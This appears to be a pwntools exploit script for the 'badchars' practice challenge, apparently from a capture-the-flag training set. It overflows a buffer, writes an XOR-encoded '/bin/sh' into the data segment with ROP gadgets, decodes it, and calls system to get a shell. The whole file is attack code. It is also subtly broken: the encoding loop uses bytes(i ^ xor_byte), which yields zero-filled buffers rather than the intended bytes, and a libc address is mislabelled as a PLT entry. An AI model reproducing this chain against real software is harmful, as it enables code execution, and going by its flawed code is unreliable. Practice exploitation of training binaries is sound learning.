#!/usr/bin/env python3
from pwn import *

# DO NOT write at start of data segment, it gets used by libc and fucks things up.
system_plt = 0x00007ffff7a6bc30
pop_rdi =  0x00000000004006a3
pop_r14_r15 = 0x00000000004006a0
xor_r15_r14 = 0x0000000000400628
mov_r13_r12 = 0x0000000000400634
pop_r12_r13 = 0x000000000040069c
data_seg = 0x0000000000601028 + 8

bin_sh = b'/bin/sh\x00'
encoded_bin_sh = b''
xor_byte = 0x23

for i in bin_sh:
    encoded_bin_sh = encoded_bin_sh + bytes(i ^ xor_byte)

# RIP offset is at 40
rop = b"A" * 40

# Write encoded /bin/sh to data_seg
rop += p64(pop_r12_r13)
rop += encoded_bin_sh
rop += p64(data_seg)
rop += p64(mov_r13_r12)

# Decode data
for i in range(len(encoded_bin_sh)):
    rop += p64(pop_r14_r15)
    rop += p64(xor_byte)
    rop += p64(data_seg + i)
    rop += p64(xor_r15_r14)

# Pop address to '/bin/sh'
rop += p64(pop_rdi)
rop += p64(data_seg)

# call system@plt
rop += p64(system_plt)

# Start process and send rop chain
e = process('badchars')
e.send(rop)
print(e.recvall())
